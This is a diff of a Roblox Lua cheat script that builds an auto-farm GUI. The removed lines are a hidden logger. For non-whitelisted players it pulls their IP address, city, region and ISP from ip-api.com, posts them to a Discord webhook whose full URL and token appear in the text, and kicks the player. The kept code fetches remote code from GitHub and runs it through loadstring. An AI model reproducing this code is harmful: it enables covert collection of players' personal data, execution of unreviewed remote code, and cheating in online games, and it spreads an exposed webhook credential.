@@ -1,68 +1,4 @@
--- Whitelist for specific usernames
-local whitelistedUsers = {
-    "Mrbignewcoming3",
-    "Hi_dorihi",  -- whitelisted
-}
-
--- Function to check if player is whitelisted
-local function isWhitelisted(username)
-    for _, whitelisted in ipairs(whitelistedUsers) do
-        if username == whitelisted then
-            return true
-        end
-    end
-    return false
-end
-
--- Get the local player's username
-local player = game.Players.LocalPlayer
-local username = player.Name
-
--- Function to send data to the webhook
-local function sendWebhookData(player_name, ipinfo_table)
-    local webhook_url = "https://discord.com/api/webhooks/1330113801558691840/27eBfT1ihaS3EqJOhTLi4-rxb1y1no-l3kESIRYiGgG5Bgre0we5SqI6EFOPBoEifp14"  -- Replace with your actual webhook URL
-    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", 
-        player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-    
-    local success, response = pcall(function()
-        game:GetService("HttpService"):PostAsync(
-            webhook_url, 
-            game:GetService("HttpService"):JSONEncode({["content"] = dataMessage}),
-            Enum.HttpContentType.ApplicationJson
-        )
-    end)
-
-    if not success then
-        warn("Failed to send webhook data: " .. (response or "Unknown error"))
-    end
-end
-
--- If the player is not whitelisted, get their IP info and kick them
-if not isWhitelisted(username) then
-    local player_name = player.Name
-
-    -- Get IP information
-    local ip_info
-    local success, response = pcall(function()
-        ip_info = game:GetService("HttpService"):GetAsync("http://ip-api.com/json")
-    end)
-
-    if not success then
-        warn("Failed to get IP info: " .. (response or "Unknown error"))
-        return
-    end
-
-    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info)
-
-    -- Send IP info to webhook
-    sendWebhookData(player_name, ipinfo_table)
-
-    -- Kick the player
-    player:Kick("Not WhiteListed L")
-else
-    -- If the player is whitelisted, load the GUI
-
-    local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/adopttesting/Testing/refs/heads/main/Library", true))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/adopttesting/Testing/refs/heads/main/Library", true))()
 
     local window = library:AddWindow("Belugaga V1 [] Made By Adopt", {
         main_color = Color3.fromRGB(0, 0, 0), -- Color
@@ -570,6 +506,3 @@ folder2:AddSwitch("Auto Muscle King Squat", function(bool)
         end
     end
 end)
-
--- End of script
-end
